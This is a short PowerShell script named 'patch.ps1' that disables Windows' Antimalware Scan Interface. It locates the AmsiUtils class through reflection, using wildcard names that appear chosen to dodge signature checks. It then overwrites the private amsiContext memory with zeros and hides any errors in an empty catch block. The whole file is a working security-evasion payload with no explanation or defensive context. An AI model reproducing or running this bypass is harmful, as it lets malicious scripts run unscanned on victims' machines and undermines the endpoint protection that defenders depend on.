# patch.ps1 - AMSI Context Corruption
try {
    $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*siUtils" }
    $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
    $ctx = $f.GetValue($null)
    $buf = New-Object byte[] 8
    $ptr = [System.IntPtr]::Add([System.IntPtr]$ctx, 0x8)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
} catch {}
